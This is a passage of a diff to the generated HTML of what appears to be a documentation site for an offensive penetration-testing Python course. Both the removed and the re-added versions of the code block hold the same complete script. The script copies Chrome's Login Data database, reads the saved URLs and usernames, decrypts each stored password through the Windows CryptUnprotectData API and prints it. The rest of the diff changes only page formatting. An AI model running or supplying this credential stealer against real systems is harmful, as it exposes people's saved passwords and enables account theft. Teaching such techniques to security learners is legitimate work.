-</span><span id="__span-5-37"><a id="__codelineno-5-37" name="__codelineno-5-37" href="#__codelineno-5-37"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">raw</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">raw</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="c1"># print the action_url (raw[0]) and print the username_value (raw[1])</span>
-</span><span id="__span-5-38"><a id="__codelineno-5-38" name="__codelineno-5-38" href="#__codelineno-5-38"></a>
-</span><span id="__span-5-39"><a id="__codelineno-5-39" name="__codelineno-5-39" href="#__codelineno-5-39"></a>    <span class="n">password</span> <span class="o">=</span> <span class="n">win32crypt</span><span class="o">.</span><span class="n">CryptUnprotectData</span><span class="p">(</span><span class="n">raw</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># pass the encrypted Password to CryptUnprotectData API function to decrypt it  </span>
-</span><span id="__span-5-40"><a id="__codelineno-5-40" name="__codelineno-5-40" href="#__codelineno-5-40"></a>
-</span><span id="__span-5-41"><a id="__codelineno-5-41" name="__codelineno-5-41" href="#__codelineno-5-41"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
-</span><span id="__span-5-42"><a id="__codelineno-5-42" name="__codelineno-5-42" href="#__codelineno-5-42"></a><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-5-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-5-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-5-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-5-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-5-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-5-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-5-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-5-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-5-10">10</a></span>
+<span class="normal"><a href="#__codelineno-5-11">11</a></span>
+<span class="normal"><a href="#__codelineno-5-12">12</a></span>
+<span class="normal"><a href="#__codelineno-5-13">13</a></span>
+<span class="normal"><a href="#__codelineno-5-14">14</a></span>
+<span class="normal"><a href="#__codelineno-5-15">15</a></span>
+<span class="normal"><a href="#__codelineno-5-16">16</a></span>
+<span class="normal"><a href="#__codelineno-5-17">17</a></span>
+<span class="normal"><a href="#__codelineno-5-18">18</a></span>
+<span class="normal"><a href="#__codelineno-5-19">19</a></span>
+<span class="normal"><a href="#__codelineno-5-20">20</a></span>
+<span class="normal"><a href="#__codelineno-5-21">21</a></span>
+<span class="normal"><a href="#__codelineno-5-22">22</a></span>
+<span class="normal"><a href="#__codelineno-5-23">23</a></span>
+<span class="normal"><a href="#__codelineno-5-24">24</a></span>
+<span class="normal"><a href="#__codelineno-5-25">25</a></span>
+<span class="normal"><a href="#__codelineno-5-26">26</a></span>
+<span class="normal"><a href="#__codelineno-5-27">27</a></span>
+<span class="normal"><a href="#__codelineno-5-28">28</a></span>
+<span class="normal"><a href="#__codelineno-5-29">29</a></span>
+<span class="normal"><a href="#__codelineno-5-30">30</a></span>
+<span class="normal"><a href="#__codelineno-5-31">31</a></span>
+<span class="normal"><a href="#__codelineno-5-32">32</a></span>
+<span class="normal"><a href="#__codelineno-5-33">33</a></span>
+<span class="normal"><a href="#__codelineno-5-34">34</a></span>
+<span class="normal"><a href="#__codelineno-5-35">35</a></span>
+<span class="normal"><a href="#__codelineno-5-36">36</a></span>
+<span class="normal"><a href="#__codelineno-5-37">37</a></span>
+<span class="normal"><a href="#__codelineno-5-38">38</a></span>
+<span class="normal"><a href="#__codelineno-5-39">39</a></span>
+<span class="normal"><a href="#__codelineno-5-40">40</a></span>
+<span class="normal"><a href="#__codelineno-5-41">41</a></span>
+<span class="normal"><a href="#__codelineno-5-42">42</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a><span class="c1"># Python For Offensive PenTest: A Complete Practical Course  - All rights reserved </span>
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2"></a><span class="c1"># Follow me on LinkedIn  https://jo.linkedin.com/in/python2</span>
+</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3"></a>
+</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4"></a><span class="kn">import</span> <span class="nn">json</span>
+</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5"></a><span class="kn">import</span> <span class="nn">base64</span>
+</span><span id="__span-5-6"><a id="__codelineno-5-6" name="__codelineno-5-6"></a><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getenv</span> 
+</span><span id="__span-5-7"><a id="__codelineno-5-7" name="__codelineno-5-7"></a><span class="c1"># To find out the Chrome SQL path- C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data</span>
+</span><span id="__span-5-8"><a id="__codelineno-5-8" name="__codelineno-5-8"></a>
+</span><span id="__span-5-9"><a id="__codelineno-5-9" name="__codelineno-5-9"></a><span class="kn">import</span> <span class="nn">sqlite3</span> <span class="c1"># To read the Chrome SQLite DB</span>
+</span><span id="__span-5-10"><a id="__codelineno-5-10" name="__codelineno-5-10"></a><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+</span><span id="__span-5-11"><a id="__codelineno-5-11" name="__codelineno-5-11"></a><span class="kn">import</span> <span class="nn">win32crypt</span>  <span class="c1"># High level library to call windows API CryptUnprotectData</span>
+</span><span id="__span-5-12"><a id="__codelineno-5-12" name="__codelineno-5-12"></a>
+</span><span id="__span-5-13"><a id="__codelineno-5-13" name="__codelineno-5-13"></a><span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">copyfile</span> <span class="c1"># To make a copy of the Chrome SQLite DB</span>
+</span><span id="__span-5-14"><a id="__codelineno-5-14" name="__codelineno-5-14"></a>
+</span><span id="__span-5-15"><a id="__codelineno-5-15" name="__codelineno-5-15"></a>
+</span><span id="__span-5-16"><a id="__codelineno-5-16" name="__codelineno-5-16"></a><span class="c1"># LOCALAPPDATA is a Windows Environment Variable which points to &gt;&gt;&gt; C:\Users\{username}\AppData\Local</span>
+</span><span id="__span-5-17"><a id="__codelineno-5-17" name="__codelineno-5-17"></a><span class="n">path</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;LOCALAPPDATA&quot;</span><span class="p">)</span><span class="o">+</span><span class="sa">r</span><span class="s2">&quot;\Google\Chrome\User Data\Default\Login Data&quot;</span>
+</span><span id="__span-5-18"><a id="__codelineno-5-18" name="__codelineno-5-18"></a>
+</span><span id="__span-5-19"><a id="__codelineno-5-19" name="__codelineno-5-19"></a><span class="c1"># make a copy the Login Data DB and pull data out of the copied DB</span>
+</span><span id="__span-5-20"><a id="__codelineno-5-20" name="__codelineno-5-20"></a><span class="n">path2</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;LOCALAPPDATA&quot;</span><span class="p">)</span><span class="o">+</span><span class="sa">r</span><span class="s2">&quot;\Google\Chrome\User Data\Default\Login2&quot;</span>
+</span><span id="__span-5-21"><a id="__codelineno-5-21" name="__codelineno-5-21"></a><span class="n">copyfile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">path2</span><span class="p">)</span>
+</span><span id="__span-5-22"><a id="__codelineno-5-22" name="__codelineno-5-22"></a>
+</span><span id="__span-5-23"><a id="__codelineno-5-23" name="__codelineno-5-23"></a><span class="c1"># Connect to the copied Database</span>
+</span><span id="__span-5-24"><a id="__codelineno-5-24" name="__codelineno-5-24"></a><span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">path2</span><span class="p">)</span>
+</span><span id="__span-5-25"><a id="__codelineno-5-25" name="__codelineno-5-25"></a>
+</span><span id="__span-5-26"><a id="__codelineno-5-26" name="__codelineno-5-26"></a>
+</span><span id="__span-5-27"><a id="__codelineno-5-27" name="__codelineno-5-27"></a><span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="c1">#Create a Cursor object and call its execute() method to perform SQL commands like SELECT</span>
+</span><span id="__span-5-28"><a id="__codelineno-5-28" name="__codelineno-5-28"></a>
+</span><span id="__span-5-29"><a id="__codelineno-5-29" name="__codelineno-5-29"></a><span class="c1"># SELECT column_name,column_name FROM table_name</span>
+</span><span id="__span-5-30"><a id="__codelineno-5-30" name="__codelineno-5-30"></a><span class="c1"># SELECT action_url and username_value and password_value FROM table logins</span>
+</span><span id="__span-5-31"><a id="__codelineno-5-31" name="__codelineno-5-31"></a><span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;SELECT action_url, username_value, password_value FROM logins&#39;</span><span class="p">)</span>
+</span><span id="__span-5-32"><a id="__codelineno-5-32" name="__codelineno-5-32"></a>
+</span><span id="__span-5-33"><a id="__codelineno-5-33" name="__codelineno-5-33"></a>
+</span><span id="__span-5-34"><a id="__codelineno-5-34" name="__codelineno-5-34"></a><span class="c1"># To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.</span>
+</span><span id="__span-5-35"><a id="__codelineno-5-35" name="__codelineno-5-35"></a><span class="k">for</span> <span class="n">raw</span> <span class="ow">in</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">():</span>
+</span><span id="__span-5-36"><a id="__codelineno-5-36" name="__codelineno-5-36"></a>
+</span><span id="__span-5-37"><a id="__codelineno-5-37" name="__codelineno-5-37"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">raw</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">raw</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="c1"># print the action_url (raw[0]) and print the username_value (raw[1])</span>
+</span><span id="__span-5-38"><a id="__codelineno-5-38" name="__codelineno-5-38"></a>
+</span><span id="__span-5-39"><a id="__codelineno-5-39" name="__codelineno-5-39"></a>    <span class="n">password</span> <span class="o">=</span> <span class="n">win32crypt</span><span class="o">.</span><span class="n">CryptUnprotectData</span><span class="p">(</span><span class="n">raw</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># pass the encrypted Password to CryptUnprotectData API function to decrypt it  </span>
+</span><span id="__span-5-40"><a id="__codelineno-5-40" name="__codelineno-5-40"></a>
+</span><span id="__span-5-41"><a id="__codelineno-5-41" name="__codelineno-5-41"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+</span><span id="__span-5-42"><a id="__codelineno-5-42" name="__codelineno-5-42"></a><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17356,7 +17518,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../../assets/javascripts/bundle.88dd0f4e.min.js"></script>
